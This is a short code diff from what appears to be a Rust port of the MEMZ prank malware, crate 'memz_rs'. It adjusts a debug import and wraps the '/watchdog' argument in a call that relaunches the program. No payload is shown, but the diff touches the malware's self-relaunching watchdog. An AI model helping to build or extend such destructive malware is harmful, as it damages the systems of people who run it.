@@ -1,4 +1,6 @@
 #[cfg(feature = "DEBUG_MODE")]
+use memz_rs::utils::log;
+#[cfg(feature = "DEBUG_MODE")]
 use memz_rs::utils::log::*;
 
 use memz_rs::{
@@ -158,7 +160,7 @@ fn main() -> Result<(), WinError> {
                 HWND(0),
                 PCWSTR::null(),
                 *file_path.as_str().to_pcwstr(),
-                "/watchdog",
+                w!("/watchdog"),
                 PCWSTR::null(),
                 SW_SHOWDEFAULT,
             )?;
